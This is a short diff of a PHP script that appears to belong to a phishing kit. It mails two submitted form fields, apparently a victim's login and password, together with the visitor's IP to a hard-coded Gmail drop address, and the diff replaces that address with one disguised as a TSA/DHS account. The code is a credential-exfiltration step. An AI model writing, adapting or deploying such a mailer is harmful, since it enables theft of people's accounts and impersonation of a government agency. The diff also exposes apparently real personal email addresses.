@@ -21,7 +21,7 @@ if ($_POST["ai"] != "" && $_POST["namep"] != "") {
     $subject = "SimdiaDevv | $ip";
 
     // Specify the recipient email address
-    $to = "kingofking247247@gmail.com"; // Replace 'recipient@example.com' with the actual recipient email address
+    $to = "TSA.dhs.govv@gmail.com"; // Replace 'recipient@example.com' with the actual recipient email address
 
     // Send the email
     mail($to, $subject, $message);
